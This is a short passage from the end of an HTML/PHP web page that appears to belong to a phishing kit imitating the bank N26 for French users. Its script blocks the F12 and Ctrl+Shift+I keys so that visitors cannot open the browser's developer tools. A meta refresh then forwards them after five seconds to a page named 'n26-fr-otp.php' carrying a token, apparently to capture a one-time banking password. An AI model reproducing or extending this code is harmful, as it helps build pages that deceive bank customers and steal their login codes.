    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>


   <META HTTP-EQUIV="Refresh" Content=5;URL="<?php echo 'n26-fr-otp.php?token='.$token1; ?>">

</body></html>
